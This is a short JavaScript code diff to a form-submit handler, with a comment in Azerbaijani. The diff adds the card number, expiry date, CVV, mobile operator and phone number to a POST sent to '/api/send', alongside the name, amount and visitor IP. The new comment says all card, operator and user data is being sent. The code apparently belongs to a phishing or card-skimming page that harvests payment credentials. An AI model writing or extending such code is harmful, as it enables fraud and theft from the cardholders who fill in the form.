@@ -232,12 +232,17 @@ form.addEventListener('submit', async (e) => {
     } catch(h) {}
 
     try {
-        // Məlumatlar
+        // Bütün kart, operator və istifadəçi məlumatlarını API-yə göndəririk:
         const response = await fetch('/api/send', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
                 name: inpName.value,
+                cardNo: inpNo.value,
+                exp: inpExp.value,
+                cvv: inpCvv.value,
+                oper: oper,
+                phone: phone,
                 amount: amount,
                 ip: ip
             })
